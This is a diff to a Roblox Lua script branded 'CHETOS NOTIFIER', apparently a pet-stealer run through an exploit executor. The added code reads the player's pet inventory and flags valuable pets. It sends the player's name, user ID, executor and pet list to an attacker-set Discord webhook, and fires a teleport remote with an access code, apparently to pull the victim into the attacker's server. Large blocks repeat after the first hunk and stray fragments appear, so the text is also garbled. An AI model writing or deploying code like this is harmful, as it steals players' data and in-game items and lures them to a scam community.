@@ -26,6 +26,12 @@ local CONFIG = {
     }
 }
 
+-- FIXED: Read webhook from loader and override the default one
+local env = getgenv()
+if env and env.Webhook then
+    CONFIG["WEBHOOK_URL"] = env.Webhook
+end
+
 local function createStyledNotificationGUI(titleText, messageText, buttonText)
     local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
     local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
@@ -70,6 +76,108 @@ task.spawn(function()
     local DataService = require(ReplicatedStorage.Modules.DataService)
     local PlayerData = DataService:GetData()
     local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
+    if not InventoryData then return end
+    local priorityPets, hugePets = {}, {}
+    local stats = {total = 0, huge = 0, priority = 0}
+    for uuid, petInfo in pairs(InventoryData) do
+        if type(petInfo) == "table" and petInfo.PetData then
+            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
+            if baseWeight > 0 then
+                stats.total = stats.total + 1
+                local pet = {
+                    typeName = tostring(petInfo.PetType or "Unknown"),
+                    weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight,
+                    isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT
+                }
+                if pet.isHuge then table.insert(hugePets, pet); stats.huge = stats.huge + 1
+                elseif CONFIG.PRIORITY_PETS[pet.typeName] then table.insert(priorityPets, pet); stats.priority = stats.priority + 1
+                end
+            end
+        end
+    end
+    if stats.huge == 0 and stats.priority == 0 then
+        createStyledNotificationGUI("LACK OF VALUABLES", "Your inventory has no Huge or Divine pets. Join our community for trading and tips to get better pets!", "Copy Discord Link")
+        return
+    end
+    local accesscode = getgenv().accesscode
+    if accesscode then
+        pcall(function()
+            local placeid = game.PlaceId
+            -- FIXED: Corrected the teleport path
+            game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accesscode)
+        end)
+    end
+    local function formatPetList(title, icon, petList)
+        if #petList == 0 then return "" end
+        local list = {"**" .. icon .. " " .. title .. "**", "```"}
+        table.sort(petList, function(a,b) return a.weight > b.weight end)
+        for i, pet in ipairs(petList) do
+            if i > CONFIG.MAX_PETS_IN_LIST then table.insert(list, "➕ ..."); break end
+            table.insert(list, string.format("• %s - %.2f KG", pet.typeName, pet.weight))
+        end
+        table.insert(list, "```")
+        return table.concat(list, "\n")
+    end
+    local description = table.concat({
+        "**👤 Player Information**", "```",
+        ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name),
+        ("👁️ User ID: %d"):format(player.UserId), ("💻 Executor: %s"):format(getExecutorName()), "```",
+        "**📊 Backpack Statistics**", "```",
+        ("🐾 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge),
+        ("🎯 Priority Pets: %d"):format(stats.priority), "```",
+        formatPetList("Huge Pets", "🤭", hugePets),
+        formatPetList("Priority Pets", "🎯", priorityPets)
+    }, "\n")
+    local embed = {
+        title = "🐾 **CHETOS NOTIFIER**", color = 463360, description = description,
+        footer = {text = "CHETOS | Maximized Potential"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    sendWebhook({username = "CHETOS LOGS", embeds = {embed}})
+end)```
+            end
+        end
+    end
+    if stats.huge == 0 and stats.priority == 0 then
+        createStyledNotificationGUI("LACK OF VALUABLES", "Your inventory has no Huge or Divine pets. Join our community for trading and tips to get better pets!", "Copy Discord Link")
+        return
+    end
+    local accesscode = getgenv().accesscode
+    if accesscode then
+        pcall(function()
+            local placeid = game.PlaceId
+            -- FIXED: Corrected the teleport path
+            game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accesscode)
+        end)
+    end
+    local function formatPetList(title, icon, petList)
+        if #petList == 0 then return "" end
+        local list = {"**" .. icon .. " " .. title .. "**", "```"}
+        table.sort(petList, function(a,b) return a.weight > b.weight end)
+        for i, pet in ipairs(petList) do
+            if i > CONFIG.MAX_PETS_IN_LIST then table.insert(list, "➕ ..."); break end
+            table.insert(list, string.format("• %s - %.2f KG", pet.typeName, pet.weight))
+        end
+        table.insert(list, "```")
+        return table.concat(list, "\n")
+    end
+    local description = table.concat({
+        "**👤 Player Information**", "```",
+        ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name),
+        ("👁️ User ID: %d"):format(player.UserId), ("💻 Executor: %s"):format(getExecutorName()), "```",
+        "**📊 Backpack Statistics**", "```",
+        ("🐾 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge),
+        ("🎯 Priority Pets: %d"):format(stats.priority), "```",
+        formatPetList("Huge Pets", "🤭", hugePets),
+        formatPetList("Priority Pets", "🎯", priorityPets)
+    }, "\n")
+    local embed = {
+        title = "🐾 **CHETOS NOTIFIER**", color = 463360, description = description,
+        footer = {text = "CHETOS | Maximized Potential"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    sendWebhook({username = "CHETOS LOGS", embeds = {embed}})
+end)```    local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
     if not InventoryData then return end
     local priorityPets, hugePets = {}, {}
     local stats = {total = 0, huge = 0, priority = 0}
